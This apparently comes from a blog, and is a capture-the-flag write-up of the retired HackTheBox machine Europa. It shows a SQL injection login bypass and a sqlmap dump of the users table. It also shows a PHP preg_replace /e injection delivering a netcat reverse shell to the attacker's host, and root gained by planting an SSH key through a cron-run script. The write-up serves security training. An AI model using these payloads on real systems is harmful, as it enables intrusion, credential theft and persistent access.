---
title: HTB: Europa
url: https://0xdf.gitlab.io/2021/02/02/htb-europa.html
date: 2021-02-02T10:00:00+00:00
difficulty: Medium [30]
os: Linux
tags: htb-europa, ctf, hackthebox, vhosts, wfuzz, sqli, injection, sqlmap, preg_replace, cron
---

![Europa](https://0xdfimages.gitlab.io/img/europa-cover.png)

Europa was a relatively easy box by today’s HTB standards, but it offers a good chance to play with the most basic of SQL injections, the auth bypass. I’ll also use sqlmap to dump the database. The foothold involves exploiting the PHP preg\_replace function, which is something you’ll only see on older hosts at this point. To get root, I’ll find a cron job that calls another script that I can write.

## Box Info

| Name | [Europa](https://hackthebox.com/machines/europa)  [Europa](https://hackthebox.com/machines/europa) [Play on HackTheBox](https://hackthebox.com/machines/europa) |
| --- | --- |
| Release Date | 23 Jun 2017 |
| Retire Date | 02 Dec 2017 |
| OS | Linux Linux |
| Base Points | Medium [30] |
| Rated Difficulty | Rated difficulty for Europa |
| Radar Graph | Radar chart for Europa |
| First Blood User | 02:11:13[f0xc4v3r1n f0xc4v3r1n](https://app.hackthebox.com/users/330) |
| First Blood Root | 02:21:19[dm0n dm0n](https://app.hackthebox.com/users/2508) |
| Creator | [ch4p ch4p](https://app.hackthebox.com/users/1) |

## Recon

### nmap

`nmap` found three open TCP ports, SSH (22), HTTP (80), and HTTPS (443):

```

root@kali# nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.22
Starting Nmap 7.80 ( https://nmap.org ) at 2021-01-21 20:16 EST
Nmap scan report for 10.10.10.22
Host is up (0.16s latency).
Not shown: 65532 filtered ports
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
443/tcp open  https

Nmap done: 1 IP address (1 host up) scanned in 14.98 seconds
root@kali# nmap -sC -sV -p 22,80,443 -oA scans/nmap-tcpscripts 10.10.10.22
Starting Nmap 7.80 ( https://nmap.org ) at 2021-01-21 20:17 EST
Nmap scan report for 10.10.10.22
Host is up (0.042s latency).

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 6b:55:42:0a:f7:06:8c:67:c0:e2:5c:05:db:09:fb:78 (RSA)
|   256 b1:ea:5e:c4:1c:0a:96:9e:93:db:1d:ad:22:50:74:75 (ECDSA)
|_  256 33:1f:16:8d:c0:24:78:5f:5b:f5:6d:7f:f7:b4:f2:e5 (ED25519)
80/tcp  open  http     Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
443/tcp open  ssl/http Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
| ssl-cert: Subject: commonName=europacorp.htb/organizationName=EuropaCorp Ltd./stateOrProvinceName=Attica/countryName=GR
| Subject Alternative Name: DNS:www.europacorp.htb, DNS:admin-portal.europacorp.htb
| Not valid before: 2017-04-19T09:06:22
|_Not valid after:  2027-04-17T09:06:22
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.65 seconds

```

Based on the [OpenSSH](https://packages.ubuntu.com/search?keywords=openssh-server) and [Apache](https://packages.ubuntu.com/search?keywords=apache2) versions, the host is likely running Ubuntu Xenial 16.04. `nmap` also identified the domain `europacorp.htb` as well as two subdomains, `www` and `admin-portal`. Visiting `https://10.10.10.22`, Firefox offers the certificate:

![image-20210121202354517](https://0xdfimages.gitlab.io/img/image-20210121202354517.png)

### Fuzz Subdomains

Given the domain and subdomains in the TLS certificate, I’ll check for other subdomains with `wfuzz` in the background while I continue with `wfuzz -c -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -H "Host: FUZZ.europacorp.htb" -u http://10.10.10.22 --hh 12455` (and the similar run over HTTPS), but it didn’t find anything else.

I’ll add the following line to my local `/etc/hosts` file:

```
10.10.10.22 europacorp.htb www.europacorp.htb admin-portal.europacorp.htb

```

### Website by IP - TCP 80 / 443

Both on HTTP and HTTPS, the site when requested by IP returns the default Apache2 Ubuntu page:

![image-20210121202635364](https://0xdfimages.gitlab.io/img/image-20210121202635364.png)

It also returns this same page for `http://europacorp.htb`, `https://europacorp.htb`, `http://www.europacorp.htb`, `https://www.europacorp.htb`, and `http://admin-portal.europacorp.htb`.

I also ran `gobuster` and didn’t find anything.

### admin-portal.europacorp.htb - TCP 443

#### Site

`https://admin-portal.europacorp.htb/login.php` loads a login portal for the EuropaCorp Server ADmin v0.2 beta:

![image-20210121203226552](https://0xdfimages.gitlab.io/img/image-20210121203226552.png)

The local JavaScript requires an email address in the top field. Some basic guessing didn’t get me anywhere.

#### SQLi

I tried to enter an email address with a `'` at the end into the page, but the local validation rules didn’t allow submission. I found a login request in Burp and kicked it over to Repeater, and added one to the end of the email:

```

POST /login.php HTTP/1.1
Host: admin-portal.europacorp.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://admin-portal.europacorp.htb/login.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 65
Connection: close
Cookie: PHPSESSID=6o0ld056n5a3v8gkvv57fg6dk5
Upgrade-Insecure-Requests: 1

email=admin%40europacorp.htb'&password=admin&remember=Remember+Me

```

The response shows a clear SQL injection opportunity:

```

HTTP/1.1 200 OK
Date: Fri, 22 Jan 2021 01:35:59 GMT
Server: Apache/2.4.18 (Ubuntu)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
Pragma: no-cache
Vary: Accept-Encoding
Content-Length: 179
Connection: close
Content-Type: text/html; charset=UTF-8

You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '21232f297a57a5a743894a0e4a801fc3'' at line 1

```

Not only is that SQLi, but it tells me that the hash being used is MD5, which I can recognize by the hash length, and verify knowing that the password I submitted was “admin”:

```

root@kali# echo -n "admin" | md5sum
21232f297a57a5a743894a0e4a801fc3  -

```

## Shell as www-data

### Access Admin Panel

#### Via SQL Bypass

There are different ways that a PHP site will execute a query to determine if a user can login. The worst is to run an SQL query for rows where the username and the password (or password hash) match, and if there are *any* results, allow login. Slightly better is to allow login only if there’s exactly one result. A better way to do it is to query based on the username, and then check that the returned result has a matching hash (this can still be bypassed, but it takes more work).

I’ll check to see if the counting method is used here. If that’s the case, the query will look something like:

```

SELECT * FROM users WHERE email='$email' and password='$password_hash';

```

If I can guess an email that I want to log in as, injection could be as simple as `admin@europacorp.htb';-- -`, resulting in:

```

SELECT * FROM users WHERE email='admin@europacorp.htb';-- -' and password='$password_hash';

```

If the email `admin@europacorp.htb` exists, this will return one row, and let me in. I’ll turn on Intercept in Burp Proxy, and submit `admin@europacorp.htb` with any password. Burp catches the request, and I’ll edit it to include the injection:

```

POST /login.php HTTP/1.1
Host: admin-portal.europacorp.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://admin-portal.europacorp.htb/login.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 39
Connection: close
Cookie: PHPSESSID=6o0ld056n5a3v8gkvv57fg6dk5
Upgrade-Insecure-Requests: 1

email=admin%40europacorp.htb';--+-&password=a

```

On sending the request, I’ll turn off intercept, and back in Firefox I’m logged in:

[![image-20210122064126269](https://0xdfimages.gitlab.io/img/image-20210122064126269.png)](https://0xdfimages.gitlab.io/img/image-20210122064126269.png)

[*Click for full image*](https://0xdfimages.gitlab.io/img/image-20210122064126269.png)

#### Via SQL Data Dump / Crack

Without logging in, I can exploit this injection to dump data from the database. Because nothing I submit is displayed back to me, I’ll have to use either blind or potentially error-based SQLi. Rather than go deep into that here, I’ll let `sqlmap` have a go at it. I’ll save one of the login requests from Burp by right clicking and selecting Copy to file, and then pass it to `sqlmap`. I’ll need to use `--force-ssl` as the HTTP site isn’t there, and `--batch` will accept the default answers to all the prompts that pop up:

```

root@kali# sqlmap -r login.request --force-ssl --batch
...[snip]...
sqlmap identified the following injection point(s) with a total of 348 HTTP(s) requests:
---
Parameter: email (POST)
    Type: boolean-based blind
    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
    Payload: email=admin@europacorp.htb' RLIKE (SELECT (CASE WHEN (3528=3528) THEN 0x61646d696e406575726f7061636f72702e687462 ELSE 0x28 END))-- ikPY&password=a

    Type: error-based
    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
    Payload: email=admin@europacorp.htb' AND GTID_SUBSET(CONCAT(0x7178787a71,(SELECT (ELT(2615=2615,1))),0x716a787071),2615)-- LvpT&password=a

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: email=admin@europacorp.htb' AND (SELECT 6362 FROM (SELECT(SLEEP(5)))fgAB)-- fZwX&password=a
---
[06:50:20] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.6
[06:50:21] [INFO] fetched data logged to text files under '/root/.sqlmap/output/admin-portal.europacorp.htb'

```

`sqlmap` found three ways to exploit this, two blind and one error-based. `sqlmap` is smart enough to keep this and apply it to future queries at the same page. I’ll start by listing the DBs:

```

root@kali# sqlmap -r login.request --force-ssl --batch --dbs 
...[snip]...
[06:57:26] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.6
[06:57:26] [INFO] fetching database names
[06:57:27] [INFO] retrieved: 'information_schema'
[06:57:27] [INFO] retrieved: 'admin'
available databases [2]:
[*] admin
[*] information_schema

[06:57:27] [INFO] fetched data logged to text files under '/root/.sqlmap/output/admin-portal.europacorp.htb'

```

Now list the tables in the admin DB:

```

root@kali# sqlmap -r login.request --force-ssl --batch -D admin --tables
...[snip]...
[06:58:50] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.6
[06:58:50] [INFO] fetching tables for database: 'admin'
[06:58:50] [INFO] retrieved: 'users'
Database: admin
[1 table]
+-------+
| users |
+-------+

[06:58:50] [INFO] fetched data logged to text files under '/root/.sqlmap/output/admin-portal.europacorp.htb'

```

I’ll dump that table:

```

root@kali# sqlmap -r login.request --force-ssl --batch -D admin -T users --dump
...[snip]...
Database: admin
Table: users
[2 entries]
+----+----------------------+--------+----------------------------------+---------------+
| id | email                | active | password                         | username      |
+----+----------------------+--------+----------------------------------+---------------+
| 1  | admin@europacorp.htb | 1      | 2b6d315337f18617ba18922c0b9597ff | administrator |
| 2  | john@europacorp.htb  | 1      | 2b6d315337f18617ba18922c0b9597ff | john          |
+----+----------------------+--------+----------------------------------+---------------+

[07:00:20] [INFO] table 'admin.users' dumped to CSV file '/root/.sqlmap/output/admin-portal.europacorp.htb/dump/admin/users.csv'
[07:00:20] [INFO] fetched data logged to text files under '/root/.sqlmap/output/admin-portal.europacorp.htb'

```

[hashes.org](https://hashes.org/) will show this cracks to “SuperSecretPassword!”, and now I can log in as either admin or john.

### RCE in preg\_replace()

#### Enumeration

On the left side `dashboard.php`, there’s a link to “Tools” (`tools.php`). This page has an “OpenVPN Config Generator”:

![image-20210122081803138](https://0xdfimages.gitlab.io/img/image-20210122081803138.png)

If I enter 1.2.3.4 as the IP, and then hit Generate!, the resulting page (still `tools.php`) displays back that dummy config text, except that each time it said “ip\_address” it now has the IP 1.2.3.4:

```

"openvpn": {
  "vtun0": {
    "local-address": {
      "10.10.10.1": "''"
    },
    "local-port": "1337",
    "mode": "site-to-site",
    "openvpn-option": [
      "--comp-lzo",
      "--float",
      "--ping 10",
      "--ping-restart 20",
      "--ping-timer-rem",
      "--persist-tun",
      "--persist-key",
      "--user nobody",
      "--group nogroup"
    ],
    "remote-address": "1.2.3.4",        <-- replaced
    "remote-port": "1337",
    "shared-secret-key-file": "/config/auth/secret"
  },
  "protocols": {
    "static": {
      "interface-route": {
        "1.2.3.4/24": {                 <-- replaced
          "next-hop-interface": {
            "vtun0": "''"
          }
        }
      }
    }
  }
}

```

The request that generates that config is interesting:

```

POST /tools.php HTTP/1.1
Host: admin-portal.europacorp.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://admin-portal.europacorp.htb/tools.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 1685
Connection: close
Cookie: PHPSESSID=6o0ld056n5a3v8gkvv57fg6dk5
Upgrade-Insecure-Requests: 1

pattern=%2Fip_address%2F&ipaddress=1.2.3.4&text=%22openvpn%22%3A+%7B%0D%0A++++++++%22vtun0%22%3A+%7B%0D%0A++++++++++++++++%22local-address%22%3A+%7B%0D%0A++++++++++++++++++++++++%2210.10.10.1%22%3A+%22%27%27%22%0D%0A++++++++++++++++%7D%2C%0D%0A++++++++++++++++%22local-port%22%3A+%221337%22%2C%0D%0A++++++++++++++++%22mode%22%3A+%22site-to-site%22%2C%0D%0A++++++++++++++++%22openvpn-option%22%3A+%5B%0D%0A++++++++++++++++++++++++%22--comp-lzo%22%2C%0D%0A++++++++++++++++++++++++%22--float%22%2C%0D%0A++++++++++++++++++++++++%22--ping+10%22%2C%0D%0A++++++++++++++++++++++++%22--ping-restart+20%22%2C%0D%0A++++++++++++++++++++++++%22--ping-timer-rem%22%2C%0D%0A++++++++++++++++++++++++%22--persist-tun%22%2C%0D%0A++++++++++++++++++++++++%22--persist-key%22%2C%0D%0A++++++++++++++++++++++++%22--user+nobody%22%2C%0D%0A++++++++++++++++++++++++%22--group+nogroup%22%0D%0A++++++++++++++++%5D%2C%0D%0A++++++++++++++++%22remote-address%22%3A+%22ip_address%22%2C%0D%0A++++++++++++++++%22remote-port%22%3A+%221337%22%2C%0D%0A++++++++++++++++%22shared-secret-key-file%22%3A+%22%2Fconfig%2Fauth%2Fsecret%22%0D%0A++++++++%7D%2C%0D%0A++++++++%22protocols%22%3A+%7B%0D%0A++++++++++++++++%22static%22%3A+%7B%0D%0A++++++++++++++++++++++++%22interface-route%22%3A+%7B%0D%0A++++++++++++++++++++++++++++++++%22ip_address%2F24%22%3A+%7B%0D%0A++++++++++++++++++++++++++++++++++++++++%22next-hop-interface%22%3A+%7B%0D%0A++++++++++++++++++++++++++++++++++++++++++++++++%22vtun0%22%3A+%22%27%27%22%0D%0A++++++++++++++++++++++++++++++++++++++++%7D%0D%0A++++++++++++++++++++++++++++++++%7D%0D%0A++++++++++++++++++++++++%7D%0D%0A++++++++++++++++%7D%0D%0A++++++++%7D%0D%0A%7D%0D%0A++++++++++++++++++++++++++++++++

```

It takes three parameters, `pattern`, `ipaddress`, and `text`. `pattern` has the value `/ip_address/`, which looks like a regex.

#### preg\_replace

The PHP function to do a regex replace is `preg_replace`. [This function](https://www.php.net/manual/en/function.preg-replace.php) takes a pattern of the form `/[regex]/[optional modifier]`, which matches what I’m seeing in the request above. The dangerous part is the [modifiers](https://www.php.net/manual/en/reference.pcre.pattern.modifiers.php), specifically `/e` or `PREG_REPLACE_EVAL`, which allows for the replacement to be evaled (executed) by PHP before it is replaced.

I’ll send this request over to Repeater, and modify it to `pattern=%2Fx%2Fe&ipaddress=system("id")&text=x`. This will likely call `preg_replace(/x/e, system("id"), x)`, which will return the output of the `id` command. On sending, the results are at the top of the page:

![image-20210122083136220](https://0xdfimages.gitlab.io/img/image-20210122083136220.png)

The command output is also captured in place where the output is:

![image-20210122083213463](https://0xdfimages.gitlab.io/img/image-20210122083213463.png)

`system` puts the output out immediately on running, but `preg_replace` is smart enough to capture that and make the substitution later anyway.

### Shell

To turn this into a shell, I just need to pass in a reverse shell into the execution. The first few I tried connected back and then just died immediately. But the netcat fifo reverse shell worked great:

```

pattern=%2Fx%2Fe&ipaddress=system("rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2>%261|nc+10.10.14.11+443+>/tmp/f")%3b&text=x

```

On submitting, I’ve got a shell as www-data:

```

root@kali# nc -lnvp 443
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.22.
Ncat: Connection from 10.10.10.22:59368.
/bin/sh: 0: can't access tty; job control turned off
$ 

```

`python` isn’t on the box, but `python3` is, so the PTY trick works to get a good shell:

```

$ python3 -c 'import pty;pty.spawn("bash")'
www-data@europa:/var/www/admin$ ^Z
[1]+  Stopped                 nc -lnvp 443
root@kali# stty raw -echo; fg
nc -lnvp 443
            reset
reset: unknown terminal type unknown
Terminal type? screen
                                                                         
www-data@europa:/var/www/admin$ 

```

There’s only one user, and `user.txt` is world-readable:

```

www-data@europa:/home/john$ ls -l user.txt 
-r--r--r-- 1 root john 33 Jun 23  2017 user.txt
www-data@europa:/home/john$ cat user.txt
2f8d40cc************************

```

## Shell as root

### Enumeration

Looking at the website, there are four folders in `/var/www`:

```

www-data@europa:/var/www$ ls            
admin  cmd  cronjobs  html

```

`admin` contains the login and dashboard. `html` has the default Apache page. This makes sense looking at the Apache config files. `000-default.conf` defines the default Apache page for everything on 80:

```

www-data@europa:/$ cat /etc/apache2/sites-enabled/000-default.conf | grep -vP '^\s#' | grep .
<VirtualHost *:80>
        ServerAdmin admin@europacorp.htb
        DocumentRoot /var/www/html
        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>
# vim: syntax=apache ts=4 sw=4 sts=4 sr noet

```

`default-ssl.conf` does the same for 443:

```

www-data@europa:/$ cat /etc/apache2/sites-enabled/default-ssl.conf | grep -vP '^\s#' | grep .
        <VirtualHost _default_:443>
                ServerAdmin admin@europacorp.htb
                DocumentRoot /var/www/html
                ErrorLog ${APACHE_LOG_DIR}/error.log
                CustomLog ${APACHE_LOG_DIR}/access.log combined
                SSLEngine on
                SSLCompression off
                SSLProtocol All -SSLv2 -SSLv3
                SSLOpenSSLConfCmd DHParameters "/etc/ssl/certs/dhparam.pem"
                SSLCipherSuite EECDH+AESGCM:EDH+AESGCM:AES256+EECDH:AES256+EDH
                SSLCertificateFile /etc/ssl/certs/server.crt
                SSLCertificateKeyFile /etc/ssl/private/private.key
        </VirtualHost>
# vim: syntax=apache ts=4 sw=4 sts=4 sr noet

```

`ssl.conf` again sets the default to point to `/var/www/html`, but also sets `admin-portal.europacorp.htb` to serve from `/var/www/admin`:

```

www-data@europa:/$ cat /etc/apache2/sites-enabled/ssl.conf | grep -vP '^\s*#' | grep .
<VirtualHost *:443>
 ServerName admin-portal.europacorp.htb
 DocumentRoot /var/www/admin
 SSLEngine on
 SSLCompression off
 SSLProtocol All -SSLv2 -SSLv3
 SSLOpenSSLConfCmd DHParameters "/etc/ssl/certs/dhparam.pem"
 SSLCipherSuite EECDH+AESGCM:EDH+AESGCM:AES256+EECDH:AES256+EDH
 SSLCertificateFile /etc/ssl/certs/server.crt
 SSLCertificateKeyFile /etc/ssl/private/private.key
 <Directory "/var/www/admin">
    AllowOverride all
    Options -Indexes
 </Directory>
</VirtualHost>
<VirtualHost *:443>
 ServerName 10.10.10.112
 DocumentRoot /var/www/html
 SSLEngine on
 SSLCompression off
 SSLProtocol All -SSLv2 -SSLv3
 SSLOpenSSLConfCmd DHParameters "/etc/ssl/certs/dhparam.pem"
 SSLCipherSuite EECDH+AESGCM:EDH+AESGCM:AES256+EECDH:AES256+EDH
 SSLCertificateFile /etc/ssl/certs/server.crt
 SSLCertificateKeyFile /etc/ssl/private/private.key
 <Directory "/var/www/html">
    AllowOverride all
    Options -Indexes
 </Directory>
</VirtualHost>

```

Back to `/var/www` , `cmd` is empty. `cronjobs` contains an executable owned by root named `clearlogs`:

```

www-data@europa:/var/www$ ls -l cronjobs/
total 4
-r-xr-xr-x 1 root root 132 May 12  2017 clearlogs

```

It’s a PHP script that empties a log file, and then calls executes `/var/www/cmd/logcleared.sh`:

```

#!/usr/bin/php
<?php
$file = '/var/www/admin/logs/access.log';
file_put_contents($file, '');
exec('/var/www/cmd/logcleared.sh');
?>

```

`logcleared.sh` doesn’t exist.

In `/etc/crontab`, there’s a line that’s calling `clearlogs` every minute:

```

www-data@europa:/$ cat /etc/crontab 
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
* * * * *       root    /var/www/cronjobs/clearlogs

```

### Execution

Given that `clearlogs` is being called every minute, and `clearlogs` is calling `logscleared.sh`, but that file doesn’t exist, if I can create it, I’ll have execution to run whatever I want. I’ll create a script that puts my tiny ed25519 public SSH key into the root `authorized_keys` file, and make it executable:

```

www-data@europa:/var/www/cmd$ echo -e '#!/bin/bash\n\nmkdir /root/.ssh\necho "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDIK/xSi58QvP1UqH+nBwpD1WQ7IaxiVdTpsg5U19G3d nobody@nothing" > /root/.ssh/authorized_keys'
#!/bin/bash

mkdir /root/.ssh
echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDIK/xSi58QvP1UqH+nBwpD1WQ7IaxiVdTpsg5U19G3d nobody@nothing" > /root/.ssh/authorized_keys

www-data@europa:/var/www/cmd$ echo -e '#!/bin/bash\n\nmkdir /root/.ssh\necho "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDIK/xSi58QvP1UqH+nBwpD1WQ7IaxiVdTpsg5U19G3d nobody@nothing" > /root/.ssh/authorized_keys' > logcleared.sh 
www-data@europa:/var/www/cmd$ chmod +x logcleared.sh

```

Now I’ll wait for the next minute to pass, and then connect with SSH as root:

```

root@kali# ssh -i ~/keys/ed25519_gen root@10.10.10.22
Welcome to Ubuntu 16.04.2 LTS (GNU/Linux 4.4.0-81-generic x86_64)
 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

0 packages can be updated.
0 updates are security updates.

Last login: Fri Jan 22 15:53:41 2021 from 10.10.14.11
root@europa:~#

```

And grab `root.txt`:

```

root@europa:~# cat root.txt
7f19438b************************

```